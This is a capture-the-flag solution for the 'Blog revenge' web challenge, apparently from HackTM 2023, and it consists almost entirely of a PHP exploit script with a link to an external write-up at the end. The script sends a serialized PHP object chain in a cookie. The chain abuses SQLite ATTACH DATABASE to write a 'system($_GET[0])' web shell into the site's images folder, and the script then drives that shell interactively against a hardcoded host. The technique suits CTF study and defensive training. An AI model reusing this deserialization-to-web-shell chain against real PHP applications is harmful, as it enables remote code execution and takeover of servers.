# WEB - Blog revenge

 Blog revenge solver
 
 ```php
<?php

include("util.php");

$GLOBALS["BLOG_REVENGE"] = "http://34.141.16.87:30001";

function request($payload)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array("Cookie: user=$payload"));
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function register($creds)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/register.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=$creds&password=$creds");
    curl_exec($ch);
    curl_close($ch);
}

function shell(string $webshell)
{
    while (true) {
        $input = urlencode(readline("$ "));
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $GLOBALS["BLOG_REVENGE"] . "/images/$webshell?0=$input");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        echo $response."\n";
    }
    curl_close($ch);
}

$webshell = "asdwiqdpomqwdpo.php";

$conn = new Conn;
$conn->queries = array(
    new Query("ATTACH DATABASE '/var/www/html/images/$webshell' AS jctf;", array()),
    new Query("CREATE TABLE jctf.pwn (dataz text);", array()),
    new Query('INSERT INTO jctf.pwn (dataz) VALUES ("<?= system($_GET[0]); ?>");', array())
);

$username = "a";
$myobj = new User($username);
$myobj->profile = new Query("", "");
$myobj->profile->query_string = new User("");
$myobj->profile->query_string->profile = $conn;


$payload = base64_encode(serialize($myobj));
register($username);

$response = request($payload);
// echo $response;

shell($webshell);
```

## External writeup

[https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023](https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023 "https://github.com/daffainfo/ctf-writeup/tree/main/HackTM%202023")

- web/Blog

By: daffainfo
